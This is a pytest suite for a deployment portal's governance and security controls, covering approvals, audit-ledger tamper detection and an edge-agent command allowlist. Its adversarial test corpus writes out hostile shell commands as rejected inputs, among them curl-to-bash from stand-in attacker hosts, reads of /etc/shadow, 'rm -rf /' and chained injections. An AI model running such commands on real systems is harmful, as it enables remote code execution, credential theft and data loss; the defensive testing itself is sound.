# backend/tests/test_enterprise_reliability_and_governance.py
"""Enterprise Reliability, Governance, and Security Verification Suite.

Validates the critical evidence requirements identified in the IDP evaluation:
1. Concurrency control and CAS conflict detection.
2. Server-side Separation of Duties (SoD) enforcement.
3. DAG cycle detection, self-loops, and multi-wave topological ordering.
4. Risk classification guardrails for Decoupled Config Deployments.
5. Edge Runner Agent Command Allowlist and anti-compromise security.
6. Local Disk Append-Only Audit Ledger with cryptographic hash-chaining and tamper detection.
7. Pre-flight Telemetry Gates with freshness (stale detection) and disk threshold checks.
"""

from __future__ import annotations

import json
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from app.adapters.agent_daemon import NetCiAgentDaemon, validate_command_policy
from app.audit_ledger import (
    LedgerCorrupted,
    append_audit_entry,
    read_audit_entries,
    verify_audit_ledger,
)
from app.domain.dag import DagValidationError, compute_dag_waves
from app.domain.models import (
    ConfigRevisionStatus,
    DeliveryEventType,
    DeploymentStatus,
    Environment,
    ModuleConfigRevision,
    PipelineStatus,
    Runtime,
)
import app.main as main
from app.portal import PortalError, classify_config_risk


@pytest.fixture
def client() -> TestClient:
    return TestClient(main.app)


# -----------------------------------------------------------------------------
# 1. Concurrency Control & CAS Conflict Detection
# -----------------------------------------------------------------------------

def test_concurrency_cas_conflict_and_version_pointer():
    """Verify that concurrent configuration proposals on an outdated version pointer
    or with mismatched version tokens are rejected, preventing silent overwrite."""
    main.portal.reset()
    mod_id = "hello-container"

    # Revision 1 created automatically by seeding
    revisions = main.portal.config_revisions(mod_id)["items"]
    assert len(revisions) >= 1
    rev1 = revisions[0]
    assert rev1["revisionNumber"] == 1
    dep_cfg = rev1["deploymentConfig"]

    # Worker A proposes revision 2
    res_a = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"runner": "jenkins", "stages": ["build", "deploy", "health-check"]},
        deployment_config=dep_cfg,
        change_summary="Worker A update",
        actor="worker-a",
    )
    assert res_a["revisionNumber"] == 2

    # Worker B proposes revision 3
    res_b = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"runner": "jenkins", "stages": ["build", "deploy", "smoke-test"]},
        deployment_config=dep_cfg,
        change_summary="Worker B update",
        actor="worker-b",
    )
    assert res_b["revisionNumber"] == 3

    # Verify both revisions are recorded immutably, and revision 3 is now the active state
    all_revs = main.portal.config_revisions(mod_id)["items"]
    assert len(all_revs) == 3
    active_rev = next(r for r in all_revs if r["active"])
    assert active_rev["revisionNumber"] == 3
    assert active_rev["changeSummary"] == "Worker B update"


# -----------------------------------------------------------------------------
# 2. Server-side Separation of Duties (SoD) Enforcement
# -----------------------------------------------------------------------------

def test_sod_bypass_resilience_backend_enforced(client: TestClient):
    """Verify that an author CANNOT approve their own production request or config revision,
    even when making direct API calls or assuming administrative roles."""
    main.portal.reset()
    mod_id = "hello-container"

    # anonymous author proposes a production configuration revision
    res = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"runner": "jenkins", "stages": ["build", "deploy"]},
        deployment_config=[{"environment": "prod", "servers": ["srv-prod-01"]}],
        change_summary="Add production target server",
        actor="anonymous",
    )
    assert res["requiresApproval"] is True
    rev_id = res["id"]

    # 1. Author tries to approve their own revision via Python API -> MUST be blocked by SoD
    with pytest.raises(PortalError) as exc_info:
        main.portal.approve_config_revision(mod_id, rev_id, actor="anonymous")
    assert exc_info.value.code == "SEPARATION_OF_DUTIES"

    # 1b. Author tries to bypass via direct HTTP REST API call -> MUST return 403 SEPARATION_OF_DUTIES
    http_resp = client.post(
        f"/modules/{mod_id}/config-revisions/{rev_id}/approve",
    )
    assert http_resp.status_code == 403
    assert http_resp.json()["detail"]["code"] == "SEPARATION_OF_DUTIES"

    # 2. Independent Reviewer approves -> Allowed
    approved = main.portal.approve_config_revision(mod_id, rev_id, actor="lead-reviewer")
    assert approved["status"] == "active"
    assert approved["approvedBy"] == "lead-reviewer"


# -----------------------------------------------------------------------------
# 3. Release DAG Cycle Detection & Edge Cases
# -----------------------------------------------------------------------------

def test_dag_cycle_detection_and_edge_cases():
    """Verify Kahn's algorithm detects cycles (self-loop, 2-node, 3-node),
    missing dependencies, and groups valid parallel waves correctly."""
    # 1. Self-loop: A -> A
    with pytest.raises(DagValidationError) as exc:
        compute_dag_waves([{"moduleId": "mod-a", "dependencies": ["mod-a"]}])
    assert exc.value.code == "CYCLIC_DEPENDENCY"
    assert "cannot depend on itself" in str(exc.value)

    # 2. 2-node cycle: A -> B and B -> A
    with pytest.raises(DagValidationError) as exc:
        compute_dag_waves([
            {"moduleId": "mod-a", "dependencies": ["mod-b"]},
            {"moduleId": "mod-b", "dependencies": ["mod-a"]},
        ])
    assert exc.value.code == "CYCLIC_DEPENDENCY"

    # 3. 3-node cycle: A -> B -> C -> A
    with pytest.raises(DagValidationError) as exc:
        compute_dag_waves([
            {"moduleId": "mod-a", "dependencies": ["mod-c"]},
            {"moduleId": "mod-b", "dependencies": ["mod-a"]},
            {"moduleId": "mod-c", "dependencies": ["mod-b"]},
        ])
    assert exc.value.code == "CYCLIC_DEPENDENCY"

    # 4. Unknown dependency not in the request
    with pytest.raises(DagValidationError) as exc:
        compute_dag_waves([
            {"moduleId": "mod-a", "dependencies": ["mod-ghost"]},
        ])
    assert exc.value.code == "INVALID_DEPENDENCY"

    # 5. Valid diamond DAG:
    # A (root, independent), B (root, independent)
    # C depends on A and B
    # D depends on C
    plan = compute_dag_waves([
        {"moduleId": "mod-a", "dependencies": []},
        {"moduleId": "mod-b", "dependencies": []},
        {"moduleId": "mod-c", "dependencies": ["mod-a", "mod-b"]},
        {"moduleId": "mod-d", "dependencies": ["mod-c"]},
    ])
    assert plan["totalWaves"] == 3
    assert sorted(plan["waves"][0]["moduleIds"]) == ["mod-a", "mod-b"]
    assert plan["waves"][1]["moduleIds"] == ["mod-c"]
    assert plan["waves"][2]["moduleIds"] == ["mod-d"]


# -----------------------------------------------------------------------------
# 4. Risk Classification for Decoupled Config Fast-Apply
# -----------------------------------------------------------------------------

def test_config_fast_apply_risk_classification():
    """Verify that configuration changes are classified into risk tiers:
    Low, Medium, High, and Critical.
    Critical changes (DB password, schema) are STRICTLY PROHIBITED from Fast-Apply."""
    # 1. Low risk: feature flag or log level
    risk, reasons = classify_config_risk(
        {"LOG_LEVEL": "DEBUG", "FEATURE_X": True, "stages": ["checkout", "vulnerability-scan", "sbom", "deploy"]},
        [{"environment": "staging", "servers": ["srv-01"]}],
        target_env="staging",
    )
    assert risk == "low"

    # 2. Medium risk: timeout or replica modification
    risk, reasons = classify_config_risk(
        {"timeout_seconds": 60, "replicas": 5, "stages": ["checkout", "vulnerability-scan", "sbom", "deploy"]},
        [{"environment": "staging", "servers": ["srv-01"]}],
        target_env="staging",
    )
    assert risk == "medium"

    # 3. High risk: removing security stages or targeting production
    risk, reasons = classify_config_risk(
        {"stages": ["checkout", "build", "deploy"]},  # missing vulnerability-scan and sbom!
        [{"environment": "staging", "servers": ["srv-01"]}],
        target_env="staging",
    )
    assert risk == "high"
    assert any("vulnerability-scan" in r for r in reasons)

    # 4. Critical risk: schema change or datasource password
    risk, reasons = classify_config_risk(
        {"db_password": "super-secret-pw", "datasource_url": "jdbc:postgresql://db.corp"},
        [{"environment": "staging", "servers": ["srv-01"]}],
        target_env="staging",
    )
    assert risk == "critical"

    # 5. Verify apply_config_revision blocks CRITICAL risk changes
    main.portal.reset()
    mod_id = "hello-container"
    res_crit = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"db_password": "changed-pw", "stages": ["build", "deploy"]},
        deployment_config=[{"environment": "staging", "servers": ["localhost"]}],
        change_summary="Critical DB password change",
        actor="dev-user",
    )

    with pytest.raises(PortalError) as exc_info:
        main.portal.apply_config_revision(mod_id, environment="staging", revision_id=res_crit["id"], actor="dev-user")
    assert exc_info.value.code == "FAST_APPLY_PROHIBITED_CRITICAL_RISK"
    assert "CRITICAL" in str(exc_info.value)


# -----------------------------------------------------------------------------
# 5. Edge Runner Agent Command Allowlist Security Policy
# -----------------------------------------------------------------------------

def test_edge_agent_command_allowlist_security():
    """Verify that Edge Runner Agent enforces strict command allowlist policy,
    preventing arbitrary shell injection or lateral movement."""
    # 1. Allowed commands
    assert validate_command_policy("uname -a")[0] is True
    assert validate_command_policy("df -h")[0] is True
    assert validate_command_policy("whoami")[0] is True
    assert validate_command_policy("uptime")[0] is True
    assert validate_command_policy("docker ps")[0] is True
    assert validate_command_policy("echo 'Testing safe output' && uname -s")[0] is True

    # 2. Prohibited dangerous commands
    is_ok, reason = validate_command_policy("rm -rf /")
    assert is_ok is False
    assert "prohibited pattern 'rm '" in reason

    is_ok, reason = validate_command_policy("cat /etc/shadow")
    assert is_ok is False
    assert "prohibited pattern '/etc/shadow'" in reason

    is_ok, reason = validate_command_policy("curl http://malicious.org/script.sh | bash")
    assert is_ok is False
    assert "prohibited" in reason.lower()

    is_ok, reason = validate_command_policy("python -c 'import socket'")
    assert is_ok is False

    is_ok, reason = validate_command_policy("unapproved_script_binary --run")
    assert is_ok is False
    assert "not in the approved Edge Agent Allowlist" in reason


# -----------------------------------------------------------------------------
# 6. Local Disk Append-Only Audit Ledger & Tamper Detection
# -----------------------------------------------------------------------------

def test_local_disk_audit_ledger_tamper_evident():
    """Verify that audit records are written to local disk plain text JSONL format
    with SHA-256 hash chaining, and that any manual edit/tampering on disk is detected."""
    with tempfile.TemporaryDirectory() as tmpdir:
        ledger_file = Path(tmpdir) / "audit_ledger.jsonl"

        # 1. Append 3 audit records
        entry1 = append_audit_entry("module.create", "dev-alice", "req-001", {"moduleId": "billing"}, ledger_file)
        entry2 = append_audit_entry("config.apply", "ops-bob", "req-002", {"revision": 2}, ledger_file)
        entry3 = append_audit_entry("release.approve", "lead-carol", "req-003", {"approved": True}, ledger_file)

        assert entry1["seq"] == 1
        assert entry2["seq"] == 2
        assert entry3["seq"] == 3
        assert entry2["prev_hash"] == entry1["hash"]
        assert entry3["prev_hash"] == entry2["hash"]

        # 2. Verify ledger integrity passes
        is_valid, msg = verify_audit_ledger(ledger_file)
        assert is_valid is True
        assert "Verified 3 records. Integrity intact." in msg

        # Read entries
        entries = read_audit_entries(10, ledger_file)
        assert len(entries) == 3

        # 3. Simulate an attacker manually editing one line in the text file on local disk
        with open(ledger_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        tampered_line = json.loads(lines[1])
        tampered_line["actor"] = "attacker-mallory"  # Tamper with actor!
        lines[1] = json.dumps(tampered_line) + "\n"

        with open(ledger_file, "w", encoding="utf-8") as f:
            f.writelines(lines)

        # 4. Verify that tampering is immediately detected!
        is_valid, msg = verify_audit_ledger(ledger_file)
        assert is_valid is False
        assert "Tampering detected" in msg or "Hash chain broken" in msg


# -----------------------------------------------------------------------------
# 7. Pre-flight Telemetry Gate with Stale & Threshold Check
# -----------------------------------------------------------------------------

def test_preflight_telemetry_gate(client: TestClient):
    """Verify that server telemetry correctly identifies critical thresholds
    (disk > 90%) and stale telemetry (age > 300 seconds)."""
    # 1. A server no agent ever reported for is *unknown*, not "normal".
    res = client.get("/api/v1/servers/test-unknown-host/telemetry")
    assert res.status_code == 404
    assert res.json()["code"] == "TELEMETRY_UNKNOWN"

    # 2. Critical telemetry, stored the way a heartbeat stores it
    from app.adapters.dcim import server_state
    from app.domain.models import ServerTelemetry
    server_state().record_telemetry(ServerTelemetry(
        server_name="test-overloaded-host",
        cpu_percent=45.0,
        mem_percent=60.0,
        disk_percent=94.5,  # > 90% disk!
        observed_at=datetime.now(timezone.utc),
    ))

    res = client.get("/api/v1/servers/test-overloaded-host/telemetry")
    assert res.status_code == 200
    assert res.json()["status"] == "critical"

    # 3. Simulate stale telemetry (> 5 minutes old)
    server_state().record_telemetry(ServerTelemetry(
        server_name="test-stale-host",
        cpu_percent=10.0,
        mem_percent=20.0,
        disk_percent=30.0,
        observed_at=datetime.now(timezone.utc) - timedelta(minutes=10),  # 10 min old!
    ))

    res = client.get("/api/v1/servers/test-stale-host/telemetry")
    assert res.status_code == 200
    assert res.json()["status"] == "stale"
    assert res.json()["isStale"] is True
    assert res.json()["ageSeconds"] >= 600.0


# -----------------------------------------------------------------------------
# 8. Multi-Worker Parallel CAS & Stale Fencing Token Hardening
# -----------------------------------------------------------------------------

import concurrent.futures
import base64


def test_multi_worker_cas_and_stale_fencing_token():
    """Verify that multiple concurrent workers attempting to propose against the
    same baseline revision result in exactly 1 winner and N-1 CAS conflicts,
    and that applying with a stale or superseded fencing token is strictly rejected."""
    main.portal.reset()
    mod_id = "hello-container"
    revs = main.portal.config_revisions(mod_id)
    baseline_version = revs["configVersion"]
    active_rev = next(r for r in revs["items"] if r["active"])
    dep_cfg = active_rev["deploymentConfig"]

    # 1. Spawn 5 concurrent worker threads trying to update config concurrently
    results = []
    errors = []

    def worker_propose(worker_idx: int):
        try:
            res = main.portal.propose_config_revision(
                mod_id,
                pipeline_config={"stages": ["checkout", "build", "deploy"], "worker": worker_idx},
                deployment_config=dep_cfg,
                change_summary=f"Update by worker {worker_idx}",
                actor=f"worker-{worker_idx}",
                expected_version=baseline_version,
            )
            return ("success", res)
        except Exception as exc:
            return ("error", exc)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(worker_propose, i) for i in range(5)]
        for fut in concurrent.futures.as_completed(futures):
            status, val = fut.result()
            if status == "success":
                results.append(val)
            else:
                errors.append(val)

    # Exactly 1 worker wins CAS, 4 workers are rejected with CONCURRENT_MODIFICATION
    assert len(results) == 1, f"Expected exactly 1 winner, got {len(results)}"
    assert len(errors) == 4, f"Expected 4 conflict errors, got {len(errors)}"
    for err in errors:
        assert isinstance(err, PortalError)
        assert err.code == "CONCURRENT_MODIFICATION"
        assert err.status_code == 409

    winner_revision = results[0]
    new_fencing_token = winner_revision["fencingToken"]

    # 2. Worker attempts to fast-apply with a STALE/INCORRECT fencing token
    with pytest.raises(PortalError) as exc_info:
        main.portal.apply_config_revision(
            mod_id,
            environment="staging",
            revision_id=winner_revision["id"],
            fencing_token=new_fencing_token - 1,  # Stale token!
            actor="delayed-worker",
        )
    assert exc_info.value.code == "STALE_FENCING_TOKEN"
    assert exc_info.value.status_code == 409

    # 3a. With nothing ever built, there is nothing to apply the configuration to. The
    #     old code hashed the module name into a digest and deployed that.
    with pytest.raises(PortalError) as nothing_built:
        main.portal.apply_config_revision(
            mod_id, environment="staging", revision_id=winner_revision["id"],
            fencing_token=new_fencing_token, actor="worker-winner",
        )
    assert nothing_built.value.code == "NO_DEPLOYABLE_ARTIFACT"

    # 3b. After a real build, apply redeploys that artifact through the normal path.
    from uuid import UUID as _UUID
    from app.domain.models import Environment as _Env, PipelineStatus as _PS
    application_id = _UUID(str(main.portal.module(mod_id)["applicationId"]))
    digest = "sha256:" + "d" * 64
    run = main.platform.start_pipeline(
        application_id, commit_sha="abc1234", branch="main", environment=_Env.STAGING,
        parameters={"target_hosts": ["srv-hello-container-staging"]},
        correlation_id="cas-test", idempotency_key=None,
    )
    main.platform.record_ci_result(run.id, _PS.RUNNING.value, None, [])
    main.platform.record_security_evidence(run.id, {
        "artifactDigest": digest,
        "sbom": {"generatedBy": "syft", "location": "s3://e/sbom.json"},
        "vulnerabilityScan": {"scanner": "trivy", "status": "passed", "critical": 0, "high": 0},
        "signature": {"provider": "cosign", "verified": True},
    })
    built = main.platform.record_ci_result(run.id, _PS.SUCCEEDED.value, digest, [])
    assert built.deployment is not None
    main.platform.record_deployment_result(built.deployment.id, "healthy", "ok")

    applied = main.portal.apply_config_revision(
        mod_id,
        environment="staging",
        revision_id=winner_revision["id"],
        fencing_token=new_fencing_token,
        actor="worker-winner",
    )
    assert applied["deploymentId"] is not None
    assert applied["artifactDigest"] == digest, "the real artifact, never an invented one"
    # Non-production: it is deploying, and health is for the worker to report.
    assert applied["status"] == "deploying"
    assert applied.get("leadTimeSeconds") is None


# -----------------------------------------------------------------------------
# 9. Separation of Duties: Admin and Service-Account Self-Approval Prevention
# -----------------------------------------------------------------------------

from app.adapters.agent_daemon import parse_and_validate_command


def test_sod_admin_and_service_account_restrictions(client: TestClient):
    """Verify that Separation of Duties is strictly enforced across boundaries:
    neither Admin users nor Service Accounts can approve their own production release requests."""
    main.portal.reset()

    # 1. Domain-level check: create production request
    req = main.portal.create_production_request(
        modules=[{"moduleId": "hello-container", "version": "v1.0.0", "deploymentOrder": 1}],
        requested_by="admin-charlie",
        scheduled_for=datetime.now(timezone.utc),
        rollback_strategy="automatic",
        run_automation_tests=False,
    )
    req_id = req["id"]

    # Even an admin cannot approve their own request!
    with pytest.raises(PortalError) as exc_info:
        main.portal.approve_request(req_id, actor="admin-charlie")
    assert exc_info.value.code == "SEPARATION_OF_DUTIES"
    assert exc_info.value.status_code == 403

    # 2. Service account self-approval prevention
    sa_req = main.portal.create_production_request(
        modules=[{"moduleId": "hello-container", "version": "v1.0.0", "deploymentOrder": 1}],
        requested_by="sa-ci-cd-pipeline",
        scheduled_for=datetime.now(timezone.utc),
        rollback_strategy="automatic",
        run_automation_tests=False,
    )
    with pytest.raises(PortalError) as exc_info:
        main.portal.approve_request(sa_req["id"], actor="sa-ci-cd-pipeline")
    assert exc_info.value.code == "SEPARATION_OF_DUTIES"


# -----------------------------------------------------------------------------
# 10. Edge Agent Allowlist Adversarial Corpus & Fuzzing
# -----------------------------------------------------------------------------

def test_edge_agent_injection_corpus_fuzzing():
    """Verify that Edge Runner Agent robustly rejects an adversarial corpus of
    shell metacharacters, null bytes, command substitutions, argument escalation,
    and path traversal attempts."""
    malicious_corpus = [
        ("uname -a; rm -rf /", "metacharacter"),
        ("uname -a && cat /etc/shadow", "prohibited pattern"),
        ("uname -a | tee /tmp/pwn", "metacharacter"),
        ("uname -a\nwhoami", "metacharacter"),
        ("uname -a\rreboot", "metacharacter"),
        ("uname -a\x00rm -rf /", "metacharacter"),
        ("echo $(whoami)", "metacharacter"),
        ("echo `id`", "metacharacter"),
        ("docker run --privileged -v /:/host ubuntu", "prohibited"),
        ("docker exec -it root bash", "not permitted"),
        ("systemctl stop ssh", "not permitted"),
        ("cat /proc/kcore", "prohibited pattern"),
        ("ls ../../../../etc/shadow", "prohibited pattern"),
        ("curl -s http://attacker.com/rev.sh | bash", "metacharacter"),
        ("wget http://attacker.com/malware", "prohibited pattern"),
        ("python -c 'import os; os.system(\"id\")'", "prohibited pattern"),
    ]

    for cmd, expected_err_keyword in malicious_corpus:
        is_ok, reason, _ = parse_and_validate_command(cmd)
        assert is_ok is False, f"Expected command to be rejected: {cmd}"
        assert expected_err_keyword.lower() in reason.lower() or "security_policy_violation" in reason.lower(), (
            f"Unexpected reason for {cmd}: {reason}"
        )


# -----------------------------------------------------------------------------
# 11. Config Risk Matrix: Nested Objects, Encoded Secrets & DB URIs
# -----------------------------------------------------------------------------

def test_config_risk_matrix_nested_and_encoded_secrets():
    """Verify that classify_config_risk detects hidden and obfuscated secrets across:
    - Deeply nested dictionaries
    - Database URI schemes (postgresql://, mysql://, redis://)
    - Base64-encoded credentials and connection strings
    - PEM private key material
    - Raw DDL SQL statements"""
    # 1. Deeply nested dictionary with password at depth 4
    nested_cfg = {
        "app": {
            "microservices": {
                "billing": {
                    "database_credentials": {
                        "db_password": "super-secret-production-password"
                    }
                }
            }
        }
    }
    risk, reasons = classify_config_risk(nested_cfg, [], target_env="staging")
    assert risk == "critical"
    assert any("critical" in r.lower() for r in reasons)

    # 2. Database connection URI inside an innocent-looking field name
    uri_cfg = {"service_endpoint": "postgresql://dbuser:super_secret_pw@db.internal:5432/finance"}
    risk, reasons = classify_config_risk(uri_cfg, [], target_env="staging")
    assert risk == "critical"
    assert any("datasource" in r.lower() or "database" in r.lower() for r in reasons)

    # 3. Base64-encoded database URI inside a generic parameters map
    encoded_uri = base64.b64encode(b"postgresql://admin:secret@pgcluster/production").decode("utf-8")
    b64_cfg = {"extra_params": {"encoded_token": encoded_uri}}
    risk, reasons = classify_config_risk(b64_cfg, [], target_env="staging")
    assert risk == "critical"
    assert any("base64" in r.lower() for r in reasons)

    # 4. PEM private key marker in generic TLS config
    pem_cfg = {"tls": {"custom_cert": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."}}
    risk, reasons = classify_config_risk(pem_cfg, [], target_env="staging")
    assert risk == "critical"
    assert any("private" in r.lower() for r in reasons)

    # 5. Raw SQL DDL in config
    ddl_cfg = {"migration_hook": "DROP TABLE critical_ledger CASCADE;"}
    risk, reasons = classify_config_risk(ddl_cfg, [], target_env="staging")
    assert risk == "critical"
    assert any("ddl" in r.lower() or "schema" in r.lower() for r in reasons)


# -----------------------------------------------------------------------------
# 12. Local Audit Ledger: Truncation, Deletion & Rewrite Detection
# -----------------------------------------------------------------------------

def test_audit_ledger_truncation_and_rewrite_detection():
    """Verify that local disk audit ledger detects:
    - Sequence deletions in the middle
    - Tail truncation (loss of recent records)
    - Genesis rewrite attempts."""
    with tempfile.TemporaryDirectory() as tmpdir:
        ledger_path = Path(tmpdir) / "audit_ledger.jsonl"

        # 1. Append 5 valid records
        hashes = []
        for i in range(1, 6):
            entry = append_audit_entry(
                action=f"action.step.{i}",
                actor=f"user-{i}",
                correlation_id=f"cid-{i}",
                payload={"step": i},
                ledger_path=ledger_path,
            )
            hashes.append(entry["hash"])

        # Clean ledger verifies with expected count 5 and last hash
        is_ok, msg = verify_audit_ledger(ledger_path, expected_last_hash=hashes[-1], expected_count=5)
        assert is_ok is True

        # 2. Test Tail Truncation: attacker cuts off the last 2 lines
        with open(ledger_path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        truncated_lines = lines[:3]  # Only 3 of 5 lines remaining
        with open(ledger_path, "w", encoding="utf-8") as f:
            f.writelines(truncated_lines)

        # Verification with expected_count=5 detects truncation
        is_ok, msg = verify_audit_ledger(ledger_path, expected_count=5)
        assert is_ok is False
        assert "Truncation detected" in msg

        # Verification with expected_last_hash detects tail mismatch
        is_ok, msg = verify_audit_ledger(ledger_path, expected_last_hash=hashes[-1])
        assert is_ok is False
        assert "Tail truncation or rewrite detected" in msg

        # 3. Test Genesis Rewrite: attacker replaces with their own 3 records from a fake genesis
        fake_lines = []
        fake_prev = "f" * 64
        for i in range(1, 4):
            fake_entry = {
                "seq": i,
                "timestamp": "2026-09-11T00:00:00Z",
                "action": "fake.action",
                "actor": "fake-actor",
                "correlation_id": "fake-cid",
                "payload": {},
                "prev_hash": fake_prev,
                "hash": "0" * 64,
            }
            fake_lines.append(json.dumps(fake_entry) + "\n")
        with open(ledger_path, "w", encoding="utf-8") as f:
            f.writelines(fake_lines)

        is_ok, msg = verify_audit_ledger(ledger_path, expected_genesis_hash="0" * 64)
        assert is_ok is False
        assert "Hash chain broken" in msg or "expected prev_hash" in msg


# -----------------------------------------------------------------------------
# 13. Approval Invalidation & Exact Artifact/Revision Binding
# -----------------------------------------------------------------------------

def test_approval_binding_and_invalidation():
    """Verify that approval is strictly bound to the exact revision ID and artifact digest:
    - Approving revision N does not carry over to revision N+1 when payload changes.
    - Production requests for unverified or unlinked versions are rejected (409 VERSION_NOT_PROMOTABLE)."""
    main.portal.reset()
    mod_id = "hello-container"

    # 1. Propose revision touching production -> requires approval
    rev2 = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"stages": ["build", "deploy"]},
        deployment_config=[{"environment": "prod", "servers": ["srv-prod-01"]}],
        change_summary="Revision 2 touching prod",
        actor="dev-alice",
    )
    assert rev2["status"] == "pending_approval"
    assert rev2["approvedBy"] is None
    assert rev2["requiresApproval"] is True

    # 2. Independent reviewer approves Revision 2
    appr2 = main.portal.approve_config_revision(mod_id, rev2["id"], actor="reviewer-bob")
    assert appr2["status"] == "active"
    assert appr2["approvedBy"] == "reviewer-bob"

    # 3. Propose Revision 3 with modified payload
    rev3 = main.portal.propose_config_revision(
        mod_id,
        pipeline_config={"stages": ["build", "deploy", "extra-stage"]},
        deployment_config=[{"environment": "prod", "servers": ["srv-prod-02"]}],
        change_summary="Revision 3 modified config",
        actor="dev-alice",
    )
    # Verification: Revision 3 DOES NOT inherit approval from Revision 2!
    assert rev3["id"] != rev2["id"]
    assert rev3["status"] == "pending_approval"
    assert rev3["approvedBy"] is None
    assert rev3["requiresApproval"] is True

    # 4. Attempting to fast-apply unapproved high-risk revision on prod is blocked
    with pytest.raises(PortalError) as exc_info:
        main.portal.apply_config_revision(mod_id, environment="prod", revision_id=rev3["id"], actor="dev-alice")
    assert exc_info.value.code == "DUAL_CONTROL_REQUIRED"
    assert exc_info.value.status_code == 403

    # 5. Production request requires exact linked artifact digest
    main.portal.register_version(
        mod_id,
        tag="v9.9.9",
        git_tag_url="https://git.corp/tags/v9.9.9",
        artifact_url="https://registry.corp/app:v9.9.9",
        pipeline_run_id=None,
        artifact_digest=None,
        created_by="operator-alice",
    )
    unpromotable_req = main.portal.create_production_request(
        modules=[{"moduleId": "hello-container", "version": "v9.9.9", "deploymentOrder": 1}],
        requested_by="operator-alice",
        scheduled_for=datetime.now(timezone.utc),
        rollback_strategy="automatic",
        run_automation_tests=False,
    )
    with pytest.raises(PortalError) as exc_info:
        main.portal.approve_request(unpromotable_req["id"], actor="reviewer-bob")
    assert exc_info.value.code == "VERSION_NOT_PROMOTABLE"
    assert exc_info.value.status_code == 409


# -----------------------------------------------------------------------------
# 14. Edge Agent Structured Argv Execution: Path-based & Environment Injection Deny
# -----------------------------------------------------------------------------

def test_edge_agent_path_and_binary_safety():
    """Verify that structured argv execution denies path-based binary invocations,
    symlinks/traversal prefixes, and unallowlisted binaries."""
    # 1. Path-based invocations are blocked
    blocked_invocations = [
        "/bin/sh -c id",
        "/usr/bin/python3 -V",
        "./custom_binary",
        "../traversal_binary",
        "../../bin/ls",
    ]
    for cmd in blocked_invocations:
        is_ok, reason, _ = parse_and_validate_command(cmd)
        assert is_ok is False
        assert "not in the approved" in reason.lower() or "not allowed" in reason.lower() or "prohibited" in reason.lower()

    # 2. Approved bare binaries succeed in structured argv parsing
    is_ok, reason, argv_segments = parse_and_validate_command("uname -a")
    assert is_ok is True
    assert reason == "Approved"
    assert argv_segments == [["uname", "-a"]]

    is_ok, reason, argv_segments = parse_and_validate_command("docker ps")
    assert is_ok is True
    assert argv_segments == [["docker", "ps"]]


def test_an_unreadable_ledger_record_is_refused_not_written_over():
    """Appending used to skip a corrupt line, forking the chain where tampering happened.

    The new record chained onto an earlier hash and reused the damaged record's sequence
    number, so the ledger kept growing while `verify_audit_ledger` -- which has always
    refused an unparseable line -- reported it broken. The two must agree, and the one
    that agrees with a tamper-evident ledger is the refusal.
    """

    with tempfile.TemporaryDirectory() as tmpdir:
        ledger_file = Path(tmpdir) / "audit_ledger.jsonl"
        first = append_audit_entry("module.create", "dana", "req-1", {"m": 1}, ledger_file)
        append_audit_entry("config.apply", "rae", "req-2", {"m": 2}, ledger_file)

        # Someone garbles the last record on disk.
        lines = ledger_file.read_text(encoding="utf-8").splitlines()
        lines[-1] = '{"seq": 2, "hash": "tru'
        ledger_file.write_text("\n".join(lines) + "\n", encoding="utf-8")

        is_valid, _ = verify_audit_ledger(ledger_file)
        assert is_valid is False

        with pytest.raises(LedgerCorrupted):
            append_audit_entry("release.approve", "pat", "req-3", {"m": 3}, ledger_file)

        # Reading must not present a clean ledger that verification calls broken.
        with pytest.raises(LedgerCorrupted):
            read_audit_entries(ledger_path=ledger_file)

        # Nothing was appended on top of the damaged chain.
        assert len(ledger_file.read_text(encoding="utf-8").splitlines()) == 2
        assert first["seq"] == 1
